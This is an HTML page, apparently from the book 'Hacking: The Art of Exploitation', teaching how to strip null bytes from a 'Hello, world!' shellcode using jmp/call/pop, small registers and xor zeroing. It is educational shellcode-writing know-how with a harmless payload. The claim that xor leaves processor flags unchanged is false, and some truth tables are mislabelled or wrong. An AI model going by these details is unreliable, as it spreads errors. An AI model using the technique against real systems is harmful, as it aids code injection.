<!DOCTYPE  html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>0x523 Removing Null Bytes</title><link href="navigation.css" rel="stylesheet" type="text/css"/><link href="document.css" rel="stylesheet" type="text/css"/></head><body><p class="top_nav"><a href="part119.htm">&lt; Previous</a><span> | </span><a href="../hacking-the-art-of-exploitation.html">Contents</a><span> | </span><a href="part121.htm">Next &gt;</a></p><p class="s32" style="padding-left: 91pt;text-indent: 0pt;text-align: left;"><a name="bookmark109">0x523 Removing Null Bytes</a></p><p style="padding-top: 6pt;padding-left: 91pt;text-indent: 0pt;line-height: 110%;text-align: left;">Looking at the disassembly, it is obvious that the first null bytes come from the <span class="s31">call </span>instruction.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_853.png"/></span></p><p class="s31" style="padding-bottom: 1pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ ndisasm -b32 helloworld1</p><table style="border-collapse:collapse;margin-left:88.94pt" cellspacing="0"><tr style="height:10pt"><td style="width:41pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 9pt;text-align: center;">00000000</p></td><td style="width:63pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">E80F<b>000000</b></p></td><td style="width:88pt"><p class="s42" style="padding-left: 17pt;text-indent: 0pt;line-height: 9pt;text-align: left;">call 0x14</p></td></tr><tr style="height:11pt"><td style="width:41pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 9pt;text-align: center;">00000005</p></td><td style="width:63pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">48</p></td><td style="width:88pt"><p class="s42" style="padding-left: 17pt;text-indent: 0pt;line-height: 9pt;text-align: left;">dec eax</p></td></tr><tr style="height:11pt"><td style="width:41pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 9pt;text-align: center;">00000006</p></td><td style="width:63pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">656C</p></td><td style="width:88pt"><p class="s42" style="padding-left: 17pt;text-indent: 0pt;line-height: 9pt;text-align: left;">gs insb</p></td></tr><tr style="height:11pt"><td style="width:41pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 9pt;text-align: center;">00000008</p></td><td style="width:63pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">6C</p></td><td style="width:88pt"><p class="s42" style="padding-left: 17pt;text-indent: 0pt;line-height: 9pt;text-align: left;">insb</p></td></tr><tr style="height:11pt"><td style="width:41pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 9pt;text-align: center;">00000009</p></td><td style="width:63pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">6F</p></td><td style="width:88pt"><p class="s42" style="padding-left: 17pt;text-indent: 0pt;line-height: 9pt;text-align: left;">outsd</p></td></tr><tr style="height:11pt"><td style="width:41pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0000000A</p></td><td style="width:63pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">2C20</p></td><td style="width:88pt"><p class="s42" style="padding-left: 17pt;text-indent: 0pt;line-height: 9pt;text-align: left;">sub al,0x20</p></td></tr><tr style="height:11pt"><td style="width:41pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0000000C</p></td><td style="width:63pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">776F</p></td><td style="width:88pt"><p class="s42" style="padding-left: 17pt;text-indent: 0pt;line-height: 9pt;text-align: left;">ja 0x7d</p></td></tr><tr style="height:11pt"><td style="width:41pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0000000E</p></td><td style="width:63pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">726C</p></td><td style="width:88pt"><p class="s42" style="padding-left: 17pt;text-indent: 0pt;line-height: 9pt;text-align: left;">jc 0x7c</p></td></tr><tr style="height:11pt"><td style="width:41pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 9pt;text-align: center;">00000010</p></td><td style="width:63pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">64210A</p></td><td style="width:88pt"><p class="s42" style="padding-left: 17pt;text-indent: 0pt;line-height: 9pt;text-align: left;">and [fs:edx],ecx</p></td></tr><tr style="height:11pt"><td style="width:41pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 9pt;text-align: center;">00000013</p></td><td style="width:63pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0D59B80400</p></td><td style="width:88pt"><p class="s42" style="padding-left: 17pt;text-indent: 0pt;line-height: 9pt;text-align: left;">or eax,0x4b859</p></td></tr><tr style="height:11pt"><td style="width:41pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 9pt;text-align: center;">00000018</p></td><td style="width:63pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0000</p></td><td style="width:88pt"><p class="s42" style="padding-left: 17pt;text-indent: 0pt;line-height: 9pt;text-align: left;">add [eax],al</p></td></tr><tr style="height:11pt"><td style="width:41pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0000001A</p></td><td style="width:63pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">BB01000000</p></td><td style="width:88pt"><p class="s42" style="padding-left: 17pt;text-indent: 0pt;line-height: 9pt;text-align: left;">mov ebx,0x1</p></td></tr><tr style="height:11pt"><td style="width:41pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0000001F</p></td><td style="width:63pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">BA0F000000</p></td><td style="width:88pt"><p class="s42" style="padding-left: 17pt;text-indent: 0pt;line-height: 9pt;text-align: left;">mov edx,0xf</p></td></tr><tr style="height:11pt"><td style="width:41pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 9pt;text-align: center;">00000024</p></td><td style="width:63pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">CD80</p></td><td style="width:88pt"><p class="s42" style="padding-left: 17pt;text-indent: 0pt;line-height: 9pt;text-align: left;">int 0x80</p></td></tr><tr style="height:11pt"><td style="width:41pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 9pt;text-align: center;">00000026</p></td><td style="width:63pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">B801000000</p></td><td style="width:88pt"><p class="s42" style="padding-left: 17pt;text-indent: 0pt;line-height: 9pt;text-align: left;">mov eax,0x1</p></td></tr><tr style="height:11pt"><td style="width:41pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0000002B</p></td><td style="width:63pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">BB00000000</p></td><td style="width:88pt"><p class="s42" style="padding-left: 17pt;text-indent: 0pt;line-height: 9pt;text-align: left;">mov ebx,0x0</p></td></tr><tr style="height:10pt"><td style="width:41pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 9pt;text-align: center;">00000030</p></td><td style="width:63pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">CD80</p></td><td style="width:88pt"><p class="s42" style="padding-left: 17pt;text-indent: 0pt;line-height: 9pt;text-align: left;">int 0x80</p></td></tr></table><p class="s31" style="padding-bottom: 3pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_854.png"/></span></p><p style="padding-top: 6pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">This instruction jumps execution forward by 19 (<span class="s31">0x13</span>) bytes, based on the first operand. The <span class="s31">call </span>instruction allows for much longer jump distances,</p><p style="padding-top: 3pt;padding-left: 91pt;text-indent: 0pt;line-height: 108%;text-align: left;">which means that a small value like 19 will have to be padded with leading zeros resulting in null bytes.</p><p style="padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: left;">One way around this problem takes advantage of two’s complement. A small negative number will have its leading bits turned on, resulting in <span class="s31">0xff </span>bytes. This means that, if we call using a negative value to move backward in execution, the machine code for that instruction won’t have any null bytes. The following revision of the helloworld shellcode uses a standard implemen- tation of this trick: Jump to the end of the shellcode to a call instruction which, in turn, will jump back to a pop instruction at the beginning of the shellcode.</p><p class="s40" style="padding-top: 8pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">helloworld2.s</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_855.png"/></span></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">BITS 32      ; Tell nasm this is 32-bit code.</p><p class="s46" style="padding-left: 91pt;text-indent: 0pt;line-height: 21pt;text-align: left;">jmp short one   ; Jump down to a call at the end. two:</p><p class="s31" style="padding-top: 1pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">; ssize_t write(int fd, const void *buf, size_t count);</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">pop ecx      ; Pop the return address (string ptr) into ecx. mov eax, 4    ; Write syscall #.</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;line-height: 107%;text-align: left;">mov ebx, 1    ; STDOUT file descriptor mov edx, 15   ; Length of the string</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">int 0x80     ; Do syscall: write(1, string, 14)</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">; void _exit(int status);</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">mov eax, 1    ; Exit syscall #</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">mov ebx, 0    ; Status = 0</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">int 0x80     ; Do syscall: exit(0)</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s46" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">one:</p><p class="s46" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">call two  ; Call back upwards to avoid null bytes</p><p class="s46" style="padding-bottom: 3pt;padding-left: 99pt;text-indent: 0pt;text-align: left;">db &quot;Hello, world!&quot;, 0x0a, 0x0d ; with newline and carriage return bytes.</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_856.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">After assembling this new shellcode, disassembly shows that the call instruction (shown in italics below) is now free of null bytes. This solves the first and most difficult null-byte problem for this shellcode, but there are still many other null bytes (shown in bold).</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_857.png"/></span></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 106%;text-align: left;">reader@hacking:~/booksrc $ nasm helloworld2.s reader@hacking:~/booksrc $ ndisasm -b32 helloworld2 00000000 EB1E       jmp short 0x20</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">00000002 59        pop ecx</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">00000003 B804<b>000000   </b>mov eax,0x4</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">00000008 BB01<b>000000   </b>mov ebx,0x1</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">0000000D BA0F<b>000000   </b>mov edx,0xf</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">00000012 CD80       int 0x80</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">00000014 B801<b>000000   </b>mov eax,0x1</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">00000019 BB<b>00000000   </b>mov ebx,0x0</p><p class="s31" style="padding-bottom: 1pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">0000001E CD80       int 0x80</p><table style="border-collapse:collapse;margin-left:88.94pt" cellspacing="0"><tr style="height:10pt"><td style="width:41pt"><p class="s44" style="padding-right: 2pt;text-indent: 0pt;line-height: 9pt;text-align: center;">00000020</p></td><td style="width:63pt"><p class="s44" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">E8DDFFFFFF</p></td><td style="width:54pt"><p class="s44" style="padding-left: 17pt;text-indent: 0pt;line-height: 9pt;text-align: left;">call 0x2</p></td></tr><tr style="height:11pt"><td style="width:41pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 9pt;text-align: center;">00000025</p></td><td style="width:63pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">48</p></td><td style="width:54pt"><p class="s42" style="padding-left: 17pt;text-indent: 0pt;line-height: 9pt;text-align: left;">dec eax</p></td></tr><tr style="height:11pt"><td style="width:41pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 9pt;text-align: center;">00000026</p></td><td style="width:63pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">656C</p></td><td style="width:54pt"><p class="s42" style="padding-left: 17pt;text-indent: 0pt;line-height: 9pt;text-align: left;">gs insb</p></td></tr><tr style="height:10pt"><td style="width:41pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 9pt;text-align: center;">00000028</p></td><td style="width:63pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">6C</p></td><td style="width:54pt"><p class="s42" style="padding-left: 17pt;text-indent: 0pt;line-height: 9pt;text-align: left;">insb</p></td></tr></table><table style="border-collapse:collapse;margin-left:88.94pt" cellspacing="0"><tr style="height:10pt"><td style="width:41pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 9pt;text-align: center;">00000029</p></td><td style="width:55pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">6F</p></td><td style="width:96pt"><p class="s42" style="padding-left: 25pt;text-indent: 0pt;line-height: 9pt;text-align: left;">outsd</p></td></tr><tr style="height:11pt"><td style="width:41pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0000002A</p></td><td style="width:55pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">2C20</p></td><td style="width:96pt"><p class="s42" style="padding-left: 25pt;text-indent: 0pt;line-height: 9pt;text-align: left;">sub al,0x20</p></td></tr><tr style="height:11pt"><td style="width:41pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 10pt;text-align: center;">0000002C</p></td><td style="width:55pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">776F</p></td><td style="width:96pt"><p class="s42" style="padding-left: 25pt;text-indent: 0pt;line-height: 10pt;text-align: left;">ja 0x9d</p></td></tr><tr style="height:11pt"><td style="width:41pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 10pt;text-align: center;">0000002E</p></td><td style="width:55pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">726C</p></td><td style="width:96pt"><p class="s42" style="padding-left: 25pt;text-indent: 0pt;line-height: 10pt;text-align: left;">jc 0x9c</p></td></tr><tr style="height:11pt"><td style="width:41pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 9pt;text-align: center;">00000030</p></td><td style="width:55pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">64210A</p></td><td style="width:96pt"><p class="s42" style="padding-left: 25pt;text-indent: 0pt;line-height: 9pt;text-align: left;">and [fs:edx],ecx</p></td></tr><tr style="height:10pt"><td style="width:41pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 9pt;text-align: center;">00000033</p></td><td style="width:55pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0D</p></td><td style="width:96pt"><p class="s42" style="padding-left: 25pt;text-indent: 0pt;line-height: 9pt;text-align: left;">db 0x0D</p></td></tr></table><p class="s31" style="padding-top: 1pt;padding-bottom: 3pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_858.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: left;">These remaining null bytes can be eliminated with an understanding of register widths and addressing. Notice that the first <span class="s31">jmp </span>instruction is actually <span class="s31">jmp short</span>. This means execution can only jump a maximum of approximately 128 bytes in either direction. The normal <span class="s31">jmp </span>instruction, as well as the call instruction (which has no short version), allows for much longer jumps. The difference between assembled machine code for the two jump varieties is shown below:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_859.png"/></span></p><p class="s31" style="padding-bottom: 3pt;padding-left: 95pt;text-indent: 0pt;text-align: left;">EB 1E       jmp short 0x20</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_860.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;text-align: left;">versus</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_861.png"/></span></p><p class="s31" style="padding-bottom: 3pt;padding-left: 95pt;text-indent: 0pt;text-align: left;">E9 1E 00 00 00  jmp 0x23</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_862.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 18pt;line-height: 107%;text-align: left;">The EAX, EBX, ECX, EDX, ESI, EDI, EBP, and ESP registers are 32 bits in width. The <span class="s27">E </span>stands for <span class="s27">extended</span>, because these were originally 16-bit reg- isters called AX, BX, CX, DX, SI, DI, BP, and SP. These original 16-bit versions of the registers can still be used for accessing the first 16 bits of each corre- sponding 32-bit register. Furthermore, the individual bytes of the AX, BX, CX, and DX registers can be accessed as 8-bit registers called AL, AH, BL, BH, CL, CH, DL, and DH, where <span class="s27">L </span>stands for <span class="s27">low byte </span>and <span class="s27">H </span>for <span class="s27">high byte</span>. Naturally, assembly instructions using the smaller registers only need to specify operands up to the register’s bit width. The three variations of a <span class="s31">mov </span>instruction are shown below.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 3pt;text-align: left;"><span><img width="152" height="4" alt="image" src="Image_863.png"/></span></p><p class="s37" style="padding-bottom: 3pt;padding-left: 93pt;text-indent: 0pt;text-align: left;">Machine code  Assembly</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 2pt;text-align: left;"><span><img width="155" height="3" alt="image" src="Image_864.png"/></span></p><p class="s38" style="padding-left: 93pt;text-indent: 0pt;text-align: left;">B8 04 00 00 00  mov eax,0x4</p><p class="s38" style="padding-top: 4pt;padding-left: 93pt;text-indent: 0pt;text-align: left;">66 B8 04 00   mov ax,0x4</p><p class="s38" style="padding-top: 4pt;padding-bottom: 2pt;padding-left: 93pt;text-indent: 0pt;text-align: left;">B0 04     mov al,0x4</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 2pt;text-align: left;"><span><img width="153" height="3" alt="image" src="Image_865.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: left;">Using the AL, BL, CL, or DL register will put the correct least significant byte into the corresponding extended register without creating any null bytes in the machine code. However, the top three bytes of the register could still contain anything. This is especially true for shellcode, since it will be taking over another process. If we want the 32-bit register values to be correct, we need to zero out the entire register before the <span class="s31">mov </span>instructions—but this, again, must be done without using null bytes. Here are some more simple assembly instructions for your arsenal. These first two are small instructions that incre- ment and decrement their operand by one.</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 3pt;text-align: left;"><span><img width="343" height="4" alt="image" src="Image_866.png"/></span></p><p class="s37" style="padding-top: 1pt;padding-bottom: 3pt;padding-left: 93pt;text-indent: 0pt;text-align: left;">Instruction  Description</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 2pt;text-align: left;"><span><img width="343" height="3" alt="image" src="Image_867.png"/></span></p><p class="s38" style="padding-left: 93pt;text-indent: 0pt;text-align: left;">inc &lt;target&gt; <span class="s48">Increment the target operand by adding 1 to it.</span></p><p class="s38" style="padding-top: 4pt;padding-bottom: 2pt;padding-left: 93pt;text-indent: 0pt;text-align: left;">dec &lt;target&gt; <span class="s48">Decrement the target operand by subtracting 1 from it.</span></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 2pt;text-align: left;"><span><img width="343" height="3" alt="image" src="Image_868.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">The next few instructions, like the <span class="s31">mov </span>instruction, have two operands. They all do simple arithmetic and bitwise logical operations between the two operands, storing the result in the first operand.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 3pt;text-align: left;"><span><img width="442" height="4" alt="image" src="Image_869.png"/></span></p><p class="s37" style="padding-bottom: 2pt;padding-left: 93pt;text-indent: 0pt;text-align: left;">Instruction      Description</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 2pt;text-align: left;"><span><img width="442" height="3" alt="image" src="Image_870.png"/></span></p><p class="s38" style="padding-bottom: 2pt;padding-left: 176pt;text-indent: -82pt;line-height: 109%;text-align: left;">add &lt;dest&gt;, &lt;source&gt; <span class="s48">Add the source operand to the destination operand, storing the result in the destination.</span></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_871.png"/></span></p><p class="s38" style="padding-bottom: 2pt;padding-left: 176pt;text-indent: -82pt;line-height: 109%;text-align: left;">sub &lt;dest&gt;, &lt;source&gt; <span class="s48">Subtract the source operand from the destination operand, storing the result in the destination.</span></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_872.png"/></span></p><p class="s38" style="padding-left: 176pt;text-indent: -82pt;line-height: 109%;text-align: left;">or &lt;dest&gt;, &lt;source&gt;  <span class="s48">Perform a bitwise </span>or <span class="s48">logic operation, comparing each bit of one operand with the corresponding bit of the other operand.</span></p><p class="s48" style="padding-top: 2pt;padding-left: 86pt;text-indent: 0pt;text-align: center;">1 or 0 = 1</p><p class="s48" style="padding-top: 1pt;padding-left: 86pt;text-indent: 0pt;text-align: center;">1 or 1 = 1</p><p class="s48" style="padding-top: 1pt;padding-left: 86pt;text-indent: 0pt;text-align: center;">0 or 1 = 1</p><p class="s48" style="padding-top: 1pt;padding-left: 86pt;text-indent: 0pt;text-align: center;">0 or 0 = 0</p><p class="s48" style="padding-top: 3pt;padding-bottom: 2pt;padding-left: 176pt;text-indent: 0pt;line-height: 107%;text-align: left;">If the source bit or the destination bit is on, or if both of them are on, the result bit is on; otherwise, the result is off. The final result is stored in the destination operand.</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_873.png"/></span></p><p class="s38" style="padding-left: 176pt;text-indent: -82pt;line-height: 109%;text-align: left;">and &lt;dest&gt;, &lt;source&gt; <span class="s48">Perform a bitwise </span>and <span class="s48">logic operation, comparing each bit of one operand with the corresponding bit of the other operand.</span></p><p class="s48" style="padding-top: 2pt;padding-left: 86pt;text-indent: 0pt;text-align: center;">1 or 0 = 0</p><p class="s48" style="padding-top: 1pt;padding-left: 86pt;text-indent: 0pt;text-align: center;">1 or 1 = 1</p><p class="s48" style="padding-top: 1pt;padding-left: 86pt;text-indent: 0pt;text-align: center;">0 or 1 = 0</p><p class="s48" style="padding-top: 1pt;padding-left: 86pt;text-indent: 0pt;text-align: center;">0 or 0 = 0</p><p class="s48" style="padding-top: 3pt;padding-bottom: 2pt;padding-left: 176pt;text-indent: 0pt;line-height: 106%;text-align: left;">The result bit is on only if both the source bit and the destination bit are on. The final result is stored in the destination operand.</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_874.png"/></span></p><p class="s38" style="padding-left: 176pt;text-indent: -82pt;line-height: 106%;text-align: left;">xor &lt;dest&gt;, &lt;source&gt; <span class="s48">Perform a bitwise exclusive </span>or <span class="s48">(</span>xor<span class="s48">) logical operation, comparing each bit of one operand with the corresponding bit of the other operand.</span></p><p class="s48" style="padding-top: 3pt;padding-left: 86pt;text-indent: 0pt;text-align: center;">1 or 0 = 1</p><p class="s48" style="padding-top: 1pt;padding-left: 86pt;text-indent: 0pt;text-align: center;">1 or 1 = 0</p><p class="s48" style="padding-top: 1pt;padding-left: 86pt;text-indent: 0pt;text-align: center;">0 or 1 = 1</p><p class="s48" style="padding-top: 1pt;padding-left: 86pt;text-indent: 0pt;text-align: center;">0 or 0 = 0</p><p class="s48" style="padding-top: 3pt;padding-bottom: 1pt;padding-left: 176pt;text-indent: 0pt;line-height: 109%;text-align: left;">If the bits differ, the result bit is on; if the bits are the same, the result bit is off. The final result is stored in the destination operand.</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 2pt;text-align: left;"><span><img width="449" height="3" alt="image" src="Image_875.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">One method is to move an arbitrary 32-bit number into the register and then subtract that value from the register using the <span class="s31">mov </span>and <span class="s31">sub </span>instructions:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_876.png"/></span></p><p class="s31" style="padding-left: 95pt;text-indent: 0pt;line-height: 10pt;text-align: left;">B8 44 33 22 11   mov eax,0x11223344</p><p class="s31" style="padding-bottom: 3pt;padding-left: 95pt;text-indent: 0pt;line-height: 10pt;text-align: left;">2D 44 33 22 11    sub eax,0x11223344</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_877.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: justify;">While this technique works, it takes 10 bytes to zero out a single register, making the assembled shellcode larger than necessary. Can you think of a way to optimize this technique? The DWORD value specified in each instruction</p><p style="padding-top: 3pt;padding-left: 91pt;text-indent: 0pt;line-height: 108%;text-align: left;">comprises 80 percent of the code. Subtracting any value from itself also pro- duces 0 and doesn’t require any static data. This can be done with a single two-byte instruction:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_878.png"/></span></p><p class="s31" style="padding-bottom: 3pt;padding-left: 95pt;text-indent: 0pt;text-align: left;">29 C0       sub eax,eax</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_879.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: left;">Using the <span class="s31">sub </span>instruction will work fine when zeroing registers at the beginning of shellcode. This instruction will modify processor flags, which are used for branching, however. For that reason, there is a preferred two- byte instruction that is used to zero registers in most shellcode. The <span class="s31">xor </span>instruc- tion performs an e<span class="s31">x</span>clusive <span class="s31">or </span>operation on the bits in a register. Since 1 <span class="s31">xor</span>ed with 1 results in a 0, and 0 <span class="s31">xor</span>ed with 0 results in a 0, any value <span class="s31">xor</span>ed with itself will result in 0. This is the same result as with any value subtracted from itself, but the <span class="s31">xor </span>instruction doesn’t modify processor flags, so it’s considered to be a cleaner method.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_880.png"/></span></p><p class="s31" style="padding-bottom: 3pt;padding-left: 95pt;text-indent: 0pt;text-align: left;">31 C0        xor eax,eax</p><p style="padding-left: 91pt;text-indent: 